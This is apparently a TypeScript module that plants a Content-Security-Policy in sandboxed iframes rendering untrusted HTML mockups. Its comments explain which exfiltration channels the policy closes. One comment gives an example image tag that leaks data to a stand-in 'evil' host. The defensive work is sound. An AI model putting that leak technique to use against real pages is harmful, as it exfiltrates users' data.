// THE iframe sandbox posture, in one place: the Content-Security-Policy every
// document we render inside `sandbox="allow-scripts"` carries, and the pure
// function that plants it.
//
// ── Why this exists (a correction) ──────────────────────────────────────────
// componentPreview.ts used to claim "There is no network inside the frame to
// fetch a real one from", and WireframeView's posture leaned on the same idea.
// It was FALSE. `sandbox="allow-scripts"` without `allow-same-origin` gives the
// frame an OPAQUE ORIGIN — it cannot touch app storage, cookies, or the parent
// DOM — but an opaque origin is still a fully networked browsing context:
// `fetch`, `XMLHttpRequest`, `sendBeacon`, `<img src>`, `<script src>` and
// `<link rel=stylesheet>` all reach any host on the internet. Tauri declares no
// `app.security.csp` either, so nothing upstream was blocking it.
//
// That gap stopped being theoretical when repo `.html/.htm/.jsx/.tsx` files
// started EXECUTING (they used to render as `<pre>` source): opening a file
// from any registry project now runs its scripts, and a mockup — or anything
// that ever gets written into one — could quietly beacon out whatever it can
// see. It can see very little, thanks to the opaque origin; "very little" is
// not "nothing", and it should not be able to send it anywhere regardless.
//
// ── Why not `default-src 'none'` and be done ────────────────────────────────
// Because Eric's real mockups would visibly break. lodestar's
// `specs/mockups/cases-compact-v1.html` preconnects to fonts.googleapis.com and
// pulls IBM Plex from it; a strict policy would drop the typeface the mockup
// was designed in and make the review surface lie about the design. So the
// policy is chosen to kill the EXFIL paths while preserving appearance:
//
//   default-src 'none'      nothing is allowed unless named below
//   script-src 'unsafe-inline'   inline only — the instrument and the preview
//                           harness are inline; no <script src> can load
//   style-src 'unsafe-inline' https:   inline CSS + remote stylesheets (fonts)
//   font-src https: data:   webfonts, and data:-embedded ones
//   img-src data: https:    embedded and remote images
//   connect-src 'none'      ★ fetch / XHR / WebSocket / EventSource /
//                           sendBeacon are BLOCKED — the actual exfil channel
//   form-action 'none'      no POSTing the DOM anywhere
//   base-uri 'none'         no rebasing relative URLs onto an attacker's host
//
// HONEST LIMIT: `img-src https:` and `font-src https:` still touch the network,
// and a URL is a channel — an `<img src="https://evil/?d=…">` still sends its
// path. This REDUCES the surface (no scripted request can be constructed and
// sent, no form can post, no remote code can load); it does not eliminate it.
// Closing that last gap means dropping remote fonts and images, which is a
// design-review trade Eric would have to choose deliberately.
//
// A document that carries its OWN CSP keeps it: browsers enforce every policy
// present, so ours can only tighten, never loosen, whatever the author wrote.
//
// ── SCOPE: this is the srcDoc frames only ───────────────────────────────────
// Two frames use this policy — WireframeView's srcDoc and componentPreview's
// shell — and BOTH still run `sandbox="allow-scripts"` alone. That is
// deliberate and load-bearing: the opaque origin is what keeps app storage and
// cookies away from markup we assembled out of untrusted repo files, and
// `connect-src 'none'` above is written assuming it.
//
// The LIVE LOCALHOST PREVIEW (`components/kb/LocalhostView.tsx`) is NOT one of
// these. It frames a URL, so no policy of ours can be planted in it at all, and
// since 2026-08-02 it carries `allow-same-origin` — an opaque origin made every
// module-based dev app render blank (its `<script type="module">` fetches are
// CORS-checked and `Origin: null` matches no dev server's allowlist). What
// keeps THAT frame away from Switchboard's backend is `ipc_guard.rs`, not a
// sandbox token. Do not reconcile the two postures; they guard different things.

/** The policy planted into every sandboxed document. */
export const FRAME_CSP = [
  "default-src 'none'",
  "script-src 'unsafe-inline'",
  "style-src 'unsafe-inline' https:",
  "font-src https: data:",
  "img-src data: https:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
].join("; ");

/** The meta tag, ready to insert. */
export function cspMeta(policy: string = FRAME_CSP): string {
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
}

/** Byte ranges covered by HTML comments, so a tag found INSIDE one is never
 *  treated as a real insertion point — mockups routinely open with a long
 *  comment block, and planting the policy inside it would be a silent no-op
 *  that looks exactly like success. */
function commentRanges(html: string): Array<[number, number]> {
  const out: Array<[number, number]> = [];
  let from = 0;
  for (;;) {
    const start = html.indexOf("<!--", from);
    if (start === -1) break;
    const end = html.indexOf("-->", start + 4);
    if (end === -1) {
      out.push([start, html.length]);
      break;
    }
    out.push([start, end + 3]);
    from = end + 3;
  }
  return out;
}

/** Index just PAST the first match of `re` that is not inside a comment, or -1. */
function endOfFirstTag(html: string, re: RegExp, comments: Array<[number, number]>): number {
  const rx = new RegExp(re.source, "gi");
  for (;;) {
    const m = rx.exec(html);
    if (!m) return -1;
    if (!comments.some(([a, b]) => m.index >= a && m.index < b)) {
      return m.index + m[0].length;
    }
  }
}

/**
 * Insert the CSP meta into an arbitrary HTML document, as early as a policy can
 * legally take effect.
 *
 * Placement matters more than it looks. The meta must come BEFORE anything it
 * governs (a stylesheet link that precedes it is already fetched), and it must
 * come AFTER the doctype — a stray element before `<!doctype html>` throws the
 * whole document into quirks mode and would silently re-lay-out every mockup.
 * So, in order: just inside `<head>`, else just after `<html>` (the parser puts
 * it in the implied head), else just after the doctype, else at the very front
 * for a bare fragment.
 */
export function injectCsp(html: string, policy: string = FRAME_CSP): string {
  const meta = cspMeta(policy);
  const comments = commentRanges(html);
  const at =
    endOfFirstTag(html, /<head\b[^>]*>/, comments) !== -1
      ? endOfFirstTag(html, /<head\b[^>]*>/, comments)
      : endOfFirstTag(html, /<html\b[^>]*>/, comments) !== -1
        ? endOfFirstTag(html, /<html\b[^>]*>/, comments)
        : endOfFirstTag(html, /<!doctype\b[^>]*>/, comments);
  if (at === -1) return meta + html;
  return html.slice(0, at) + meta + html.slice(at);
}
